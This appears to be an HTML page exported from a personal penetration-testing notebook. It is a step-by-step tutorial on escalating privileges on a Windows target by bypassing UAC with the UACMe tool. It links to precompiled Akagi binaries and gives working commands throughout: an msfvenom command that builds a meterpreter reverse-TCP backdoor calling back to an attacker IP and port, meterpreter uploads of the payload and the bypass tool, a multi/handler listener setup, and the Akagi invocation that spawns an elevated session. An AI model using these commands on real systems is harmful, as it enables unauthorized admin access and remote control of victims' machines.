<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>UACMe Tool</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>UACMe Tool</h1><br /><br /><strong>
      <h3>Requirements:</h3>
    </strong><br />• session already established with the target machine<br /><strong>
      <h3>What we want to do?</h3>
    </strong><br />• establish another session with the target machine now with Admin privileges<br /><br />Site of the
    tool: <a href="https://github.com/hfiref0x/UACME" target="_blank">https://github.com/hfiref0x/UACME</a><br /><br /><span
      style="text-decoration:underline;">The main purpose of the UACME tool is bypass UAC</span> and to do it can
    implement different methods.<br />We have to run in it on the target machine and select the method to use
    <br /><br /><br />1. <strong>Use Visual Studio to compile the </strong><strong><span style="color:#00ff00;">UAC
        Bypass(UACME)</span></strong>.<br />UACME is a Windows program without a binary executable file but only Source
    code, because of that we have first to compile it in Windows!<strong><br /></strong><a
      href="file://C:/CherryTree/Files/network security/post_exploitation/privilege_escalation/Akagi32.zip">→ HERE ←</a>
    i have already compiled the program(folder:<a
      href="file://C:/CherryTree/Files/network security/post_exploitation/privilege_escalation">..\CherryTree\Files\network
      security\post_exploitation\privilege_escalation</a>)<br />32 bit: <a
      href="https://github.com/DenFox93/Compiled-programs/raw/main/Akagi32.exe" target="_blank">https://github.com/DenFox93/Compiled-programs/raw/main/Akagi32.exe</a><br />64
    bit: <a
      href="https://github.com/DenFox93/Compiled-programs/raw/main/Akagi64.exe" target="_blank">https://github.com/DenFox93/Compiled-programs/raw/main/Akagi64.exe</a><strong><br /></strong><br /><br /><strong>2.
      Use msfvenom to create the </strong><strong><span style="color:#a020f0;" target="_blank">payload</span></strong><br />We have to
    use it as a backdoor in the Windows machine<br />LHOST and LPORT are respectively the Ip address of the attacker
    machine and its listening ports<br />
    <div class="codebox">
      <div class="codebox">
        msfvenom&nbsp;-p&nbsp;windows/meterpreter/reverse_tcp&nbsp;LHOST=192.168.1.122&nbsp;LPORT=2345&nbsp;-f&nbsp;exe&nbsp;-o&nbsp;/home/kali/Desktop/exploit.exe
      </div>
    </div><br /> <a href=""><img src="images/845-1.png" alt="images/845-1.png" /></a><br /><br />3. <strong>From the
      first established session we have to upload both the </strong><strong><span
        style="color:#a020f0;">payload</span></strong><strong> and the </strong><strong><span style="color:#00ff00;">UAC
        Bypass</span></strong><strong> to on the target machine</strong><br />Come back to the session that we have
    already but <span style="text-decoration:underline;">without admin privileges</span> and upload the the files to the
    target<br />
    <div class="codebox">
      <div class="codebox">
        meterpreter&nbsp;&gt;&nbsp;upload&nbsp;/home/kali/Desktop/exploit.exe&nbsp;&quot;C:\Documents&nbsp;and&nbsp;Settings\Administrator\Desktop&quot;&nbsp;&nbsp;&nbsp;#upload&nbsp;of&nbsp;exploit.exe<br />meterpreter&nbsp;&gt;&nbsp;upload&nbsp;/home/kali/Desktop/Akagi32.exe&nbsp;&quot;C:\Documents&nbsp;and&nbsp;Settings\Administrator\Desktop&quot;&nbsp;&nbsp;&nbsp;#upload&nbsp;of&nbsp;Akagi32.exe
      </div>
    </div><br /> <a href=""><img src="images/845-2.png" alt="images/845-2.png" /></a><br />
    <div class="codebox">
      <div class="codebox">
        meterpreter&nbsp;&gt;&nbsp;getprivs&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#we&nbsp;can&nbsp;see&nbsp;that&nbsp;now&nbsp;we&nbsp;do&nbsp;not&nbsp;have&nbsp;admin&nbsp;privileges
      </div>
    </div><br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;whoami&nbsp;/priv&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#alternative
      </div>
    </div><br /> <a href=""><img src="images/845-3.png" alt="images/845-3.png" /></a><br /> <a href=""><img
        src="images/845-4.png" alt="images/845-4.png" /></a><br /><br /><strong>4. We have to set up the
    </strong><strong><span style="color:#ff8700;">payload on the Attacker machine</span></strong><strong> accordingly to
      the payload of the </strong><strong><span style="color:#a020f0;">msfvenom payload </span></strong><br />
    <div class="codebox">
      <div class="codebox">
        meterpreter&nbsp;&gt;&nbsp;background&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#put&nbsp;in&nbsp;background&nbsp;session&nbsp;without&nbsp;admin&nbsp;privileges<br />msf&nbsp;&gt;&nbsp;use&nbsp;exploit/multi/handler<br />msf&nbsp;&gt;&nbsp;set&nbsp;PAYLOAD&nbsp;windows/meterpreter/reverse_tcp&nbsp;&nbsp;&nbsp;#same&nbsp;payload&nbsp;of&nbsp;msfvenom<br />msf&nbsp;&gt;&nbsp;show&nbsp;options<br />msf&nbsp;&gt;&nbsp;set&nbsp;LHOST&nbsp;192.168.1.122<br />msf&nbsp;&gt;&nbsp;set&nbsp;LPORT&nbsp;2345<br />msf&nbsp;&gt;&nbsp;run&nbsp;-j&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#wait&nbsp;for&nbsp;incoming&nbsp;connections&nbsp;in&nbsp;BACKGROUND
      </div>
    </div><br /><a href=""><img src="images/845-5.png" alt="images/845-5.png" /></a><br />Now we have to wait for the
    connection from the target, that we can do from the first meterpreter session(without
    privileges)<br /><br /><strong>5. From the first session(without privileges) create a new meterpreter session(with
      privileges) </strong><br />
    <div class="codebox">
      <div class="codebox">
        msf&nbsp;&gt;&nbsp;sessions&nbsp;-l<br />msf&nbsp;&gt;&nbsp;sessions&nbsp;-i&nbsp;1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#session&nbsp;whitout&nbsp;privileges<br />meterpreter&gt;&nbsp;shell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#to&nbsp;have&nbsp;a&nbsp;shell,&nbsp;otherwise&nbsp;we&nbsp;have&nbsp;to&nbsp;use&nbsp;the&nbsp;&quot;execute&quot;&nbsp;command&nbsp;for&nbsp;execute<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#a&nbsp;command<br />C:\Users\danie\Desktop&gt;&nbsp;Akagi32.exe&nbsp;10&nbsp;C:\Users\danie\Desktop\exploit.exe
      </div>
    </div><br /><a href=""><img src="images/845-6.png" alt="images/845-6.png" /></a><br />
    <div class="codebox">
      <div class="codebox"><span
          style="color:#000000;font-weight:400">(</span>ENTER&nbsp;to&nbsp;return&nbsp;to&nbsp;C:\Users\danie\Desktop&gt;&nbsp;<span
          style="color:#000000;font-weight:400">)</span></div>
    </div><br />
    <div class="codebox">
      <div class="codebox">
        C:\Users\danie\Desktop&gt;&nbsp;CTRL-C&nbsp;to&nbsp;come&nbsp;back&nbsp;to&nbsp;meterpreter<br />meterpreter&nbsp;&gt;&nbsp;background
      </div>
    </div><br /><a href=""><img src="images/845-7.png" alt="images/845-7.png" /></a><br />
    <div class="codebox">
      <div class="codebox">meterpreter&nbsp;&gt;&nbsp;sessions<br />meterpreter&nbsp;&gt;&nbsp;sessions&nbsp;-i&nbsp;2
      </div>
    </div><br /><a href=""><img src="images/845-8.png" alt="images/845-8.png" /></a><br />
    <h2>Now we have Admin privileges!</h2><br /><a href=""><img src="images/845-9.png"
        alt="images/845-9.png" /></a><br /><br /><br />
  </div>
</body>

</html>